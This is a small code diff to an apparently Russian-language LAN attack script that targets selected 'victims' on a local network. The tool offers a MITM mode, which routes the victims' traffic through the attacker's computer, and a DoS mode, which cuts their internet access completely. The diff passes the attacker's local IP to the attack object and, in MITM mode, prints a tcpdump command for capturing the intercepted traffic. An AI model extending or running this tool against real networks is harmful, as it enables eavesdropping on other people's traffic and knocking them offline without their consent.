@@ -362,9 +362,11 @@ def confirm_and_start_attack(attack, network_info):
         print("\033[1;31m[!] Нет выбранных жертв. Выход.\033[0m")
         sys.exit(1)
     
-    # Передаем локальный MAC в объект атаки
+    # Передаем локальный MAC и IP в объект атаки
     if 'local_mac' in network_info:
         attack.set_local_mac(network_info['local_mac'])
+    if 'local_ip' in network_info:
+        attack.set_local_ip(network_info['local_ip'])
     
     # Выбор режима атаки
     mode = run_fzf(
@@ -377,6 +379,8 @@ def confirm_and_start_attack(attack, network_info):
         attack.set_mitm_mode(True)
         mode_text = "MITM (трафик пойдет через ваш компьютер)"
         warning = "\033[1;32m✓  Жертвы будут иметь доступ к интернету через ваш ПК\033[0m"
+        print("\033[1;33m[!] Для перехвата трафика используйте Wireshark или tcpdump:\033[0m")
+        print(f"\033[1;36m    sudo tcpdump -i {attack.interface} -w capture.pcap\033[0m")
     else:
         attack.set_mitm_mode(False)
         mode_text = "DoS (полное отключение интернета)"
